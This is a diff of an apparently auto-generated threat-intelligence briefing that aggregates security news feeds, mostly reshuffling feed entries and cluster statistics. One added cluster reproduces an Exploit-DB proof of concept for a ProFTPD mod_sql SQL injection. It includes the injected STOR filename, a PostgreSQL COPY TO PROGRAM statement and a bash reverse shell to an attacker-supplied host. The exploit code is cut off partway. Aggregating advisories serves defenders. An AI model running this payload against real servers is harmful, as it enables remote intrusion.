@@ -1,14 +1,14 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-08-25T15:50:19.732050+00:00
+- Generated: 2026-08-25T16:44:31.809617+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
-- Feeds OK: 73
-- Total items in window: 297
-- Total clusters raw: 131
+- Feeds OK: 74
+- Total items in window: 293
+- Total clusters raw: 133
 - Total clusters in packet: 52
-- Dropped low score: 79
+- Dropped low score: 81
 - Dropped overflow: 0
 
 ## Cohort metadata
@@ -80,16 +80,6 @@
   - Status: ok
   - Item count: 15
   - In window count: 4
-- **SentinelOne Labs** (threat_research_primary)
-  - URL: https://www.sentinelone.com/labs/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
-- **Trend Micro Research** (threat_research_primary)
-  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
-  - Status: ok
-  - Item count: 25
-  - In window count: 0
 - **Microsoft Security Blog** (threat_research_primary)
   - URL: https://www.microsoft.com/en-us/security/blog/feed/
   - Status: ok
@@ -100,26 +90,31 @@
   - Status: parse_error
   - Item count: 0
   - In window count: 0
+- **SentinelOne Labs** (threat_research_primary)
+  - URL: https://www.sentinelone.com/labs/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
+- **Trend Micro Research** (threat_research_primary)
+  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
+  - Status: ok
+  - Item count: 25
+  - In window count: 0
 - **Microsoft Threat Intelligence** (threat_research_primary)
   - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
   - Status: ok
   - Item count: 10
+  - In window count: 0
+- **Sekoia** (threat_research_primary)
+  - URL: https://blog.sekoia.io/feed/
+  - Status: parse_error
+  - Item count: 0
   - In window count: 0
 - **Kaspersky Securelist** (threat_research_primary)
   - URL: https://securelist.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 1
-- **Sekoia** (threat_research_primary)
-  - URL: https://blog.sekoia.io/feed/
-  - Status: parse_error
-  - Item count: 0
-  - In window count: 0
-- **Check Point Research** (threat_research_primary)
-  - URL: https://research.checkpoint.com/feed/
-  - Status: ok
-  - Item count: 15
-  - In window count: 2
 - **NCSC UK** (government_authoritative)
   - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
   - Status: ok
@@ -135,6 +130,21 @@
   - Status: ok
   - Item count: 10
   - In window count: 10
+- **Recorded Future** (threat_research_primary)
+  - URL: https://www.recordedfuture.com/feed
+  - Status: ok
+  - Item count: 50
+  - In window count: 2
+- **Check Point Research** (threat_research_primary)
+  - URL: https://research.checkpoint.com/feed/
+  - Status: ok
+  - Item count: 15
+  - In window count: 2
+- **Horizon3 Attack Research** (offensive_vulnerability_research)
+  - URL: https://horizon3.ai/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 7
 - **ESET WeLiveSecurity** (threat_research_primary)
   - URL: https://www.welivesecurity.com/en/rss/feed/
   - Status: ok
@@ -145,91 +155,86 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Recorded Future** (threat_research_primary)
-  - URL: https://www.recordedfuture.com/feed
-  - Status: ok
-  - Item count: 50
-  - In window count: 2
-- **Horizon3 Attack Research** (offensive_vulnerability_research)
-  - URL: https://horizon3.ai/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 7
-- **Cisco Talos** (threat_research_primary)
-  - URL: https://feeds.feedburner.com/feedburner/Talos
-  - Status: ok
-  - Item count: 15
-  - In window count: 5
 - **GitHub Security Lab** (offensive_vulnerability_research)
   - URL: https://github.blog/category/security/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **Cisco Talos** (threat_research_primary)
+  - URL: https://feeds.feedburner.com/feedburner/Talos
+  - Status: ok
+  - Item count: 15
+  - In window count: 5
 - **Red Canary** (detection_response_operations)
   - URL: https://redcanary.com/feed/
   - Status: ok
   - Item count: 10
+  - In window count: 1
+- **watchTowr Labs** (offensive_vulnerability_research)
+  - URL: https://labs.watchtowr.com/rss/
+  - Status: ok
+  - Item count: 15
+  - In window count: 0
+- **Exploit-DB** (offensive_vulnerability_research)
+  - URL: https://www.exploit-db.com/rss.xml
+  - Status: ok
+  - Item count: 50
   - In window count: 1
 - **PortSwigger Research** (offensive_vulnerability_research)
   - URL: https://portswigger.net/research/rss
   - Status: ok
   - Item count: 40
   - In window count: 1
-- **The DFIR Report** (detection_response_operations)
-  - URL: https://thedfirreport.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
-- **watchTowr Labs** (offensive_vulnerability_research)
-  - URL: https://labs.watchtowr.com/rss/
-  - Status: ok
-  - Item count: 15
+- **Black Hills Information Security** (detection_response_operations)
+  - URL: https://www.blackhillsinfosec.com/feed/
+  - Status: parse_error
+  - Item count: 0
   - In window count: 0
 - **Assetnote** (offensive_vulnerability_research)
   - URL: https://www.assetnote.io/resources/research/rss.xml
   - Status: parse_error
   - Item count: 0
   - In window count: 0
-- **TrustedSec** (detection_response_operations)
-  - URL: https://www.trustedsec.com/feed/
+- **The DFIR Report** (detection_response_operations)
+  - URL: https://thedfirreport.com/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 1
-- **Black Hills Information Security** (detection_response_operations)
-  - URL: https://www.blackhillsinfosec.com/feed/
-  - Status: parse_error
-  - Item count: 0
   - In window count: 0
 - **Proofpoint Threat Insight** (detection_response_operations)
   - URL: https://www.proofpoint.com/us/rss.xml
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **TrustedSec** (detection_response_operations)
+  - URL: https://www.trustedsec.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
 - **Active Countermeasures** (detection_response_operations)
   - URL: https://www.activecountermeasures.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Elastic Security Labs** (detection_response_operations)
-  - URL: https://www.elastic.co/security-labs/rss/feed.xml
-  - Status: ok
-  - Item count: 20
-  - In window count: 2
 - **Sophos X-Ops** (detection_response_operations)
   - URL: https://news.sophos.com/en-us/category/threat-research/feed/
   - Status: ok
   - Item count: 15
   - In window count: 1
-- **SpecterOps** (detection_response_operations)
-  - URL: https://medium.com/feed/specter-ops-posts
+- **Elastic Security Labs** (detection_response_operations)
+  - URL: https://www.elastic.co/security-labs/rss/feed.xml
   - Status: ok
-  - Item count: 10
-  - In window count: 0
+  - Item count: 20
+  - In window count: 2
 - **Datadog Security Labs** (cloud_identity_infrastructure)
   - URL: https://securitylabs.datadoghq.com/rss/feed.xml
   - Status: ok
   - Item count: 30
   - In window count: 2
+- **SpecterOps** (detection_response_operations)
+  - URL: https://medium.com/feed/specter-ops-posts
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **Orca Security Research** (cloud_identity_infrastructure)
   - URL: https://orca.security/resources/blog/feed/
   - Status: ok
@@ -240,11 +245,6 @@
   - Status: ok
   - Item count: 20
   - In window count: 4
-- **Rapid7** (offensive_vulnerability_research)
-  - URL: https://www.rapid7.com/blog/rss/
-  - Status: ok
-  - Item count: 20
-  - In window count: 3
 - **Permiso Security** (cloud_identity_infrastructure)
   - URL: https://permiso.io/blog/rss.xml
   - Status: ok
@@ -255,10 +255,20 @@
   - Status: ok
   - Item count: 100
   - In window count: 0
-- **Exploit-DB** (offensive_vulnerability_research)
-  - URL: https://www.exploit-db.com/rss.xml
-  - Status: parse_error
-  - Item count: 0
+- **Cloudflare Security** (cloud_identity_infrastructure)
+  - URL: https://blog.cloudflare.com/tag/security/rss/
+  - Status: ok
+  - Item count: 20
+  - In window count: 0
+- **Rapid7** (offensive_vulnerability_research)
+  - URL: https://www.rapid7.com/blog/rss/
+  - Status: ok
+  - Item count: 20
+  - In window count: 3
+- **Sysdig** (detection_response_operations)
+  - URL: https://sysdig.com/feed/
+  - Status: ok
+  - Item count: 100
   - In window count: 0
 - **Google Cloud Threat Intelligence** (threat_research_primary)
   - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
@@ -270,40 +280,20 @@
   - Status: ok
   - Item count: 20
   - In window count: 1
-- **Cloudflare Security** (cloud_identity_infrastructure)
-  - URL: https://blog.cloudflare.com/tag/security/rss/
-  - Status: ok
-  - Item count: 20
-  - In window count: 0
 - **Protect AI** (ai_security_agentic_risk)
   - URL: https://protectai.com/blog/rss.xml
   - Status: parse_error
   - Item count: 0
-  - In window count: 0
-- **Sysdig** (detection_response_operations)
-  - URL: https://sysdig.com/feed/
-  - Status: ok
-  - Item count: 100
   - In window count: 0
 - **Cloudflare Radar** (cloud_identity_infrastructure)
   - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
   - Status: ok
   - Item count: 20
   - In window count: 0
-- **Coveware** (ransomware_ecrime_financial_crime)
-  - URL: https://www.coveware.com/blog?format=rss
-  - Status: parse_error
-  - Item count: 0
-  - In window count: 0
 - **Wiz Research** (cloud_identity_infrastructure)
   - URL: https://www.wiz.io/feed/rss.xml
   - Status: ok
   - Item count: 99
-  - In window count: 3
-- **OpenSSF Blog** (ai_security_agentic_risk)
-  - URL: https://openssf.org/feed/
-  - Status: ok
-  - Item count: 10
   - In window count: 2
 - **Google DeepMind Blog** (ai_security_agentic_risk)
   - URL: https://deepmind.google/blog/rss.xml
@@ -315,16 +305,26 @@
   - Status: ok
   - Item count: 10
   - In window count: 2
-- **The Record** (cyber_news_breach_reporting)
-  - URL: https://therecord.media/feed
+- **Coveware** (ransomware_ecrime_financial_crime)
+  - URL: https://www.coveware.com/blog?format=rss
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
+- **OpenSSF Blog** (ai_security_agentic_risk)
+  - URL: https://openssf.org/feed/
   - Status: ok
-  - Item count: 5
-  - In window count: 5
+  - Item count: 10
+  - In window count: 2
 - **BleepingComputer** (cyber_news_breach_reporting)
   - URL: https://www.bleepingcomputer.com/feed/
   - Status: ok
   - Item count: 15
   - In window count: 15
+- **The Record** (cyber_news_breach_reporting)
+  - URL: https://therecord.media/feed
+  - Status: ok
+  - Item count: 5
+  - In window count: 5
 - **Interconnects** (ai_security_agentic_risk)
   - URL: https://www.interconnects.ai/feed
   - Status: ok
@@ -339,7 +339,12 @@
   - URL: https://cloudblog.withgoogle.com/rss/
   - Status: ok
   - Item count: 20
-  - In window count: 18
+  - In window count: 16
+- **GreyNoise** (cloud_identity_infrastructure)
+  - URL: https://www.greynoise.io/blog/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 0
 - **CyberScoop** (cyber_news_breach_reporting)
   - URL: https://cyberscoop.com/feed/
   - Status: ok
@@ -350,26 +355,26 @@
   - Status: ok
   - Item count: 20
   - In window count: 0
-- **GreyNoise** (cloud_identity_infrastructure)
-  - URL: https://www.greynoise.io/blog/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 0
 - **Simon Willison** (ai_security_agentic_risk)
   - URL: https://simonwillison.net/atom/everything/
   - Status: ok
   - Item count: 30
   - In window count: 17
-- **Dark Reading** (cyber_news_breach_reporting)
-  - URL: https://www.darkreading.com/rss.xml
-  - Status: ok
-  - Item count: 50
-  - In window count: 25
 - **Help Net Security** (cyber_news_breach_reporting)
   - URL: https://www.helpnetsecurity.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
+- **Dark Reading** (cyber_news_breach_reporting)
+  - URL: https://www.darkreading.com/rss.xml
+  - Status: ok
+  - Item count: 50
+  - In window count: 25
+- **Krebs on Security** (practitioner_analysis)
+  - URL: https://krebsonsecurity.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **Troy Hunt** (practitioner_analysis)
   - URL: https://www.troyhunt.com/rss/
   - Status: ok
@@ -380,43 +385,28 @@
   - Status: ok
   - Item count: 10
   - In window count: 8
-- **Team Cymru** (ransomware_ecrime_financial_crime)
-  - URL: https://www.team-cymru.com/post/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 0
 - **Reddit r/cybersecurity** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/cybersecurity/.rss
   - Status: ok
   - Item count: 0
+  - In window count: 0
+- **Team Cymru** (ransomware_ecrime_financial_crime)
+  - URL: https://www.team-cymru.com/post/rss.xml
+  - Status: ok
+  - Item count: 100
   - In window count: 0
 - **Reddit r/blueteamsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/blueteamsec/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Graham Cluley** (practitioner_analysis)
-  - URL: https://grahamcluley.com/feed/
-  - Status: ok
-  - Item count: 20
-  - In window count: 4
 - **Reddit r/sysadmin** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/sysadmin/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Krebs on Security** (practitioner_analysis)
-  - URL: https://krebsonsecurity.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
 - **Reddit r/msp** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/msp/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
-- **Reddit r/AskNetsec** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/AskNetsec/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
@@ -425,11 +415,16 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **The Hacker News** (cyber_news_breach_reporting)
-  - URL: https://feeds.feedburner.com/TheHackersNews
+- **Reddit r/AskNetsec** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/AskNetsec/.rss
   - Status: ok
-  - Item count: 50
-  - In window count: 50
+  - Item count: 0
+  - In window count: 0
+- **Graham Cluley** (practitioner_analysis)
+  - URL: https://grahamcluley.com/feed/
+  - Status: ok
+  - Item count: 20
+  - In window count: 4
 - **Intel 471** (ransomware_ecrime_financial_crime)
   - URL: https://intel471.com/blog/feed
   - Status: ok
@@ -440,21 +435,26 @@
   - Status: ok
   - Item count: 100
   - In window count: 27
+- **The Hacker News** (cyber_news_breach_reporting)
+  - URL: https://feeds.feedburner.com/TheHackersNews
+  - Status: ok
+  - Item count: 50
+  - In window count: 50
 - **Reddit r/netsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/netsec/.rss
   - Status: ok
   - Item count: 25
-  - In window count: 12
-- **Embrace the Red** (ai_security_agentic_risk)
-  - URL: https://embracethered.com/blog/index.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 0
+  - In window count: 10
 - **tl;dr sec** (practitioner_analysis)
   - URL: https://tldrsec.com/feed.xml
   - Status: ok
   - Item count: 20
   - In window count: 1
+- **Embrace the Red** (ai_security_agentic_risk)
+  - URL: https://embracethered.com/blog/index.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 0
 - **Risky Business News** (practitioner_analysis)
   - URL: https://risky.biz/feeds/risky-business-news/
   - Status: ok
@@ -477,7 +477,7 @@
 - Anchor signal: Android
 - Theme key: android
 - Cluster count: 5
-- Article count: 15
+- Article count: 14
 - Cohesion: 0.229
 - Shared strong signals: Android
 - Member CVEs: (none)
@@ -497,7 +497,6 @@
   - https://www.darkreading.com/vulnerabilities-threats/zimbra-flaw-exploitation-shrinking-window-patch
   - https://thehackernews.com/2026/08/microsoft-entra-id-flaw-cvss-100.html
   - https://unit42.paloaltonetworks.com/large-scale-credential-attacks/
-  - https://www.wiz.io/blog/detecting-entra-device-registration-abuse
   - https://securelist.com/android-head-unit-malware/121106/
   - https://risky.biz/RBNEWS604/
   - https://thehackernews.com/2026/08/whatsapp-adds-multiple-passkeys-for.html
@@ -507,9 +506,9 @@
 ### web shell backdoor targeting Apple iOS/macOS
 - Anchor signal: Apple iOS/macOS
 - Theme key: apple-ios-macos
-- Cluster count: 4
-- Article count: 5
-- Cohesion: 0.256
+- Cluster count: 5
+- Article count: 6
+- Cohesion: 0.255
 - Shared strong signals: Apple iOS/macOS
 - Member CVEs: (none)
 - Also targets: (none)
@@ -517,67 +516,14 @@
   - threat_categories: web_shell_backdoor
   - affected_products: Apple iOS/macOS
   - urgency_signals: preauth_unauth
-- Cluster IDs: af5d25c59b, a42d9f28e9, 175a6a518c, 114ded0230
+- Cluster IDs: af5d25c59b, a42d9f28e9, 175a6a518c, 114ded0230, dadc215b5f
 - Links:
   - https://www.rapid7.com/blog/post/ra-microsoft-sharepoint-remote-code-execution-cve-2026-63520
   - https://thehackernews.com/2026/08/critical-macos-sharepoint-vcenter-and.html
   - https://www.infosecurity-magazine.com/news/australia-exploitation-teamcity/
   - https://www.wiz.io/blog/rust-supply-chain-attack-on-arrayref-significant-overlap-with-dprk-campaigns
   - https://www.sophos.com/en-us/blog/fake-ai-real-malware-attackers-impersonating-ai-brands
-
-### Microsoft Entra active exploitation
-- Anchor signal: Microsoft Entra
-- Theme key: microsoft-entra
-- Cluster count: 4
-- Article count: 10
-- Cohesion: 0.238
-- Shared strong signals: Microsoft Entra
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: active_exploitation, ddos
-  - affected_industries: government
-  - affected_products: Gogs, Microsoft Entra, Android
-  - urgency_signals: critical_cvss, actively_exploited, preauth_unauth
-- Cluster IDs: b61187f40b, 6117c1d701, f53fdb391c, 9f44f5f9a4
-- Links:
-  - https://thehackernews.com/2026/08/actively-exploited-oracle-weblogic-flaw.html
-  - https://www.securityweek.com/cisa-warns-of-exploited-oracle-weblogic-vulnerability/
-  - https://thehackernews.com/2026/08/attackers-exploit-zimbra-snmp-flaw-for.html
-  - https://www.helpnetsecurity.com/2026/08/25/zimbra-cve-2026-73570-compromised/
-  - https://www.darkreading.com/vulnerabilities-threats/zimbra-flaw-exploitation-shrinking-window-patch
-  - https://thehackernews.com/2026/08/microsoft-entra-id-flaw-cvss-100.html
-  - https://unit42.paloaltonetworks.com/large-scale-credential-attacks/
-  - https://www.wiz.io/blog/detecting-entra-device-registration-abuse
-  - https://thehackernews.com/2026/08/isolated-vm-flaw-lets-sandboxed.html
-  - https://www.reddit.com/r/netsec/comments/1vru26k/how_a_popular_android_library_silently_exposed/
-
-### Gogs active exploitation
-- Anchor signal: Gogs
-- Theme key: gogs
-- Cluster count: 4
-- Article count: 10
-- Cohesion: 0.238
-- Shared strong signals: Gogs
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: active_exploitation, ddos
-  - affected_industries: government
-  - affected_products: Gogs, Microsoft Entra, Android
-  - urgency_signals: critical_cvss, actively_exploited, preauth_unauth
-- Cluster IDs: b61187f40b, 6117c1d701, f53fdb391c, 9f44f5f9a4
-- Links:
-  - https://thehackernews.com/2026/08/actively-exploited-oracle-weblogic-flaw.html
-  - https://www.securityweek.com/cisa-warns-of-exploited-oracle-weblogic-vulnerability/
-  - https://thehackernews.com/2026/08/attackers-exploit-zimbra-snmp-flaw-for.html
-  - https://www.helpnetsecurity.com/2026/08/25/zimbra-cve-2026-73570-compromised/
-  - https://www.darkreading.com/vulnerabilities-threats/zimbra-flaw-exploitation-shrinking-window-patch
-  - https://thehackernews.com/2026/08/microsoft-entra-id-flaw-cvss-100.html
-  - https://unit42.paloaltonetworks.com/large-scale-credential-attacks/
-  - https://www.wiz.io/blog/detecting-entra-device-registration-abuse
-  - https://thehackernews.com/2026/08/isolated-vm-flaw-lets-sandboxed.html
-  - https://www.reddit.com/r/netsec/comments/1vru26k/how_a_popular_android_library_silently_exposed/
+  - https://thehackernews.com/2026/08/a-malicious-webpage-could-poison-your.html
 
 ### CVE-2026-73570 exploitation activity
 - Anchor signal: CVE-2026-73570
@@ -719,7 +665,7 @@
 
 ### Novelty
 - Novel cves: 1
-  - CVE-2024-28224 (first seen via The Hacker News at 2026-08-25T14:07:37+00:00, cluster dadc215b5f)
+  - CVE-2026-42167 (first seen via Exploit-DB at 2026-08-25T00:00:00+00:00, cluster c0dbc49702)
 - Novel actors: 0
 - Novel products: 0
 
@@ -787,7 +733,7 @@
 
 ## Clusters
 
-### Cluster af5d25c59b — score 33
+### Cluster af5d25c59b — score 32
 
 - Title: Rapid7 Analysis: Microsoft SharePoint Remote Code Execution (CVE-2026-63520)
 - Source: Rapid7 (offensive_vulnerability_research)
@@ -935,6 +881,49 @@ GitLab CE/EE GraphQL Directive Code Injection Vulnerability CVE-2026-19478 is a 
   - Published: 2026-08-18T21:25:58+00:00
   - Link: https://www.darkreading.com/application-security/critical-gitlab-zero-click-flaw-mitigation-challenges
   - Summary: A lack of technical details could make it hard for organizations running self-managed GitLab versions to detect potential exploitation of CVE-2026-19478.
+
+### Cluster c0dbc49702 — score 27
+
+- Title: [remote] CVE-2026-42167 - ProFTPD mod_sql post-authentication SQLi - RCE
+- Source: Exploit-DB (offensive_vulnerability_research)
+- Published: 2026-08-25T00:00:00+00:00
+- Link: https://www.exploit-db.com/exploits/52658
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: CVE-2026-42167
+
+#### Cluster taxonomy (union across members)
+- cve_ids: CVE-2026-42167
+- urgency_signals: poc_available
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_1_offensive_research
+
+#### Primary article taxonomy
+- cve_ids: CVE-2026-42167
+- urgency_signals: poc_available
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_1_offensive_research
+
+#### Summary
+
+```
+CVE-2026-42167 - ProFTPD mod_sql post-authentication SQLi - RCE
+```
+
+#### Full body
+
+```
+Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training CVE-2026-42167 - ProFTPD mod_sql post-authentication SQLi - RCE EDB-ID: 52658 CVE: 2026-42167 EDB Verified: Author: youcef-! Type: remote Exploit: / Platform: Multiple Date: 2026-08-25 Vulnerable App: #!/usr/bin/env python3 """ CVE-2026-42167 — ProFTPD mod_sql post-authentication SQL injection -> RCE postauth_stor_rce.py --host <ftp-host> --port 21 \ --user <user> --password <pass> \ --shell-host <your-ip> --shell-port 443 SUMMARY ------- ProFTPD's mod_sql logs FTP activity through user-supplied SQL. Its escaping helper is_escaped_text() treats any value that BEGINS and ENDS with a single quote and contains no interior single quote as "already escaped", and passes it into the query verbatim. A STOR filename shaped that way therefore breaks out of the logging INSERT and stacks a second statement. With a PostgreSQL backend whose role is a superuser, that statement is COPY ... TO PROGRAM, which runs an arbitrary OS command. INSERT INTO xfer_audit VALUES('<basename>', '<user>', now()) basename = ', null, null); COPY (SELECT $$x$$) TO PROGRAM $$<cmd>$$; --' -> INSERT INTO xfer_audit VALUES('', null, null); -- 3 cols, closed COPY (SELECT $$x$$) TO PROGRAM $$<cmd>$$; -- stacked --', '<user>', now()) -- commented out Two constraints on the filename shape both queries around: * NO interior single quote -> the injected SQL is dollar-quoted ($$...$$), never single-quoted. * NO forward slash '/' -> FTP forbids it in a filename. The reverse shell needs /dev/tcp/<host>/<port>, so the slashes are produced at runtime by printf's octal escape \57 ('/'). THE BUG IN THE PUBLIC PoC (fixed here) -------------------------------------- The widely-circulated PoC builds the path as one printf format string: printf "\57dev\57tcp\57<host>\57<port>" # BROKEN printf greedily consumes up to THREE octal digits after a backslash. "\57" is only two, so if the very next character is itself an octal digit (0-7) it is swallowed into the escape: \57 + '1' -> \571 -> octal 571 = 0x179 -> 0x79 mod 256 = 'y' So a host or port whose first character is 0-7 is silently corrupted: host=192.168.118.7 port=4444 -> /dev/tcpy92.168.118.7/y444 (broken) That covers essentially every private-range attacker IP and every common listener port, which is why the bug is easy to miss (the PoC's defaults happen to fall in the safe class) and painful to hit — the only visible symptom is a reverse shell that never connects. FIX (this script): keep the four literal slashes in the format string, where each "\57" is followed by a non-octal character, and pass the attacker- controlled host/port as printf ARGUMENTS instead of interpolating them into the format string: printf "\57dev\57tcp\57%s\57%s" "<host>" "<port>" # CORRECT Now no user-controlled digit is ever adjacent to a "\57", so the corruption is structurally impossible for any host/port and on any conforming printf. CVE: CVE-2026-42167 SEVERITY: Critical (post-auth RCE) """ import argparse import ftplib import io import os import select import signal import socket import sys import termios import threading import time import tty def build_payload_filename(shell_host: str, shell_port: int) -> str: """Return the STOR filename that stacks a reverse-shell COPY TO PROGRAM. The reverse-shell command carries the target host/port as printf arguments (the fix), so no octal-escape corruption is possible. """ # /dev/tcp/<host>/<port> is assembled at runtime; the format string holds # only the slashes, the data is passed as %s arguments. shell_cmd = ( f'S=$(printf "\\57dev\\57tcp\\57%s\\57%s" "{shell_host}" "{shell_port}");' f'bash -c "bash -i >& $S 0>&1"' ) payload = ( "', null, null); " f"COPY (SELECT $$x$$) TO PROGRAM $${shell_cmd}$$" "; --'" ) # is_escaped_text() bypass + FTP filename rules — assert, don't hope. assert payload[0] == "'" and payload[-1] == "'", "must be single-quote wrapped" assert "'" not in payload[1:-1], "no interio
+```
+
+#### Corroborating sources (1)
+
+- **Exploit-DB** (offensive_vulnerability_research)
+  - Title: [remote] CVE-2026-42167 - ProFTPD mod_sql post-authentication SQLi - RCE
+  - Published: 2026-08-25T00:00:00+00:00
+  - Link: https://www.exploit-db.com/exploits/52658
+  - Summary: CVE-2026-42167 - ProFTPD mod_sql post-authentication SQLi - RCE
 
 ### Cluster 73e2ba5a94 — score 27
 
@@ -1265,8 +1254,8 @@ Infosecurity Magazine Home » News » Australia Warns of Active Exploitation of 
 - Published: 2026-08-21T06:06:11+00:00
 - Link: https://thehackernews.com/2026/08/microsoft-entra-id-flaw-cvss-100.html
 - Fetch status: ok
-- Member count: 3
-- Corroborating source count: 3
+- Member count: 2
+- Corroborating source count: 2
 - Strong signals: Microsoft Entra
 
 #### Cluster taxonomy (union across members)
@@ -1276,7 +1265,7 @@ Infosecurity Magazine Home » News » Australia Warns of Active Exploitation of 
 - cve_ids: CVE-2026-68820, CVE-2026-69836
 - urgency_signals: actively_exploited, critical_cvss, preauth_unauth, zero_day
 - content_type: news_report
-- confidence_tier: tier_1_primary_research, tier_2_operator, tier_4_news
+- confidence_tier: tier_1_primary_research, tier_4_news
 
 #### Primary article taxonomy
 - threat_categories: zero_day, ddos, active_exploitation
@@ -1299,7 +1288,7 @@ Update: The story was updated after publication to note that the vulnerability h
 Microsoft Patches Severe Entra ID Flaw (CVSS 10.0) Allowing Remote Code Execution  Ravie Lakshmanan  Aug 21, 2026 Vulnerability / Threat Intelligence Update: The story was updated after publication to note that the vulnerability has not been exploited. Although the security bulletin originally marked the "Exploited" field under the Exploitability Assessment table as "Yes," on August 21, 2026, Microsoft corrected the "Exploited" status to "No" after The Hacker News contacted the company for comment. It also noted, "this vulnerability was not exploited in the wild." "We identified and addressed this issue with a fix and released CVE-2026-69836 for greater transparency . There are no additional actions customers need to take,” a Microsoft spokesperson told The Hacker News. The headline has been edited to reflect this change. The original story follows below - Microsoft on Thursday warned of a maximum-severity security flaw in Entra ID that it said has been exploited in the wild, but noted that no customer action is required. The vulnerability, tracked as CVE-2026-69836 (CVSS score: 10.0), is a case of remote code execution impacting the tech giant's cloud-based identity and access management service. It was previously called Azure Active Directory or Azure AD. "Deserialization of untrusted data in Microsoft Entra ID allows an unauthorized attacker to execute code over a network," Microsoft said in an alert released Thursday. Flaws of this kind occur when an application converts user-controlled data back into an active object or code structure without proper validation. This can lead to code execution, denial-of-service, or access control bypass that can permit an attacker to perform unauthorized actions. The company credited principal security engineer Robert Fitzpatrick for discovering and reporting the issue. As of writing, there are currently no details on how the vulnerability has been exploited, when these efforts began and if they are still ongoing, and how it was discovered. "This vulnerability has already been fully mitigated by Microsoft," it added. "There is no action for users of this service to take." Earlier this month, Redmond also patched a high-severity security privilege escalation flaw affecting Windows Ancillary Function Driver for WinSock (CVE-2026-68820, CVSS score: 7.0) that was exploited as a zero-day by the North Korea-linked Lazarus Group as part of a long-running campaign dubbed Operation Dream Job. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Cloud security , Cyber Attack , enterprise security , Identity Security , Microsoft , remote code execution , Threat Intelligence , Vulnerability ⚡ Top Stories This Week Microsoft Patches Severe Entra ID Flaw (CVSS 10.0) Allowing Remote Code Execution ThreatsDay: Gogs 10.0 RCE, n8n Workflow-to-RCE, $10M Reward, GLM-5.3 AI Exploit, and More New Cryptographic Context Injection Attack Could Let Web Pages Steal Grok Chat Data Zombie Card Attack Can Revive Expired Visa Cards for Contactless Payments CDN Tsunami Attack Abuses HTTP/3 Translation for Up to 350x DoS Amplification Manic Android Malware Exfiltrates Data From Offline Phones via Nearby Infected Devices Cloudflare Workers Spectre Attack Leaks JWT From Co-Located Worker at 12 Bits/Second OpenAI Pauses Frontier RL Training as It Tightens Defenses Against Unsafe AI Behavior Hackers Compromised 14,500+ Dahua Devices Using Credential Attacks, Auth Bypasses, and P2P Microsoft Copilot Personal Flaws Could Let One Click Exfiltrate Data From Connected Apps AI "Mind Viruses" Can Spread Between Agents Through Persistent Prompt Files SafePal Hardware Wallet Maker Says Flaw Exposed Data of Nearly 40,000 Customers Critical GitLab GraphQL Flaw Could Let Unauthenticated Attackers Delete Public Projects ⚡ Weekly Recap: VMware Exploits, Windows 0-Day, MCP Attacks, Browser Hijacks and More Unisoc VoLTE
 ```
 
-#### Corroborating sources (3)
+#### Corroborating sources (2)
 
 - **The Hacker News** (cyber_news_breach_reporting)
   - Title: Microsoft Patches Severe Entra ID Flaw (CVSS 10.0) Allowing Remote Code Execution
@@ -1311,11 +1300,6 @@ Microsoft Patches Severe Entra ID Flaw (CVSS 10.0) Allowing Remote Code Executio
   - Published: 2026-08-18T19:05:33+00:00
   - Link: https://unit42.paloaltonetworks.com/large-scale-credential-attacks/
   - Summary: In August 2026, the actor TheHatman claimed to have stolen large volume of credentials from organizations' Microsoft Entra tenants. We provide guidance on mitigating large-scale credential attacks. The post Threat Brief: Mitigating Large-Scale Credential Attacks (Updated August 18) appeared first on Unit 42 .
-- **Wiz Research** (cloud_identity_infrastructure)
